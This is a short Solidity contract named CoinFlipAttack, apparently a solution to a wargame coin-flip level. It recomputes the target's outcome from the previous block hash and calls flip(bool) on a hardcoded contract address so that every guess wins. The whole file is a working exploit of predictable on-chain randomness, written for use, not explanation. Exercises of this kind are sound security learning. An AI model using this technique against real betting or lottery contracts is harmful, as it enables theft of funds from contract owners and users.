pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract CoinFlipAttack {
    using SafeMath for uint256;

    address private coinFlipInstance =
        0x94Bb82cC7E3c948471E31A6bB22e90414dBf5e10;

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    event Flipped(bool callSuccess, bool flipWin);

    function flipCoin() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        (bool success, bytes memory retVal) = coinFlipInstance.call(abi.encodeWithSignature("flip(bool)", side));
        bool flipSuccess = abi.decode(retVal, (bool));
        emit Flipped(success, flipSuccess);
    }
}

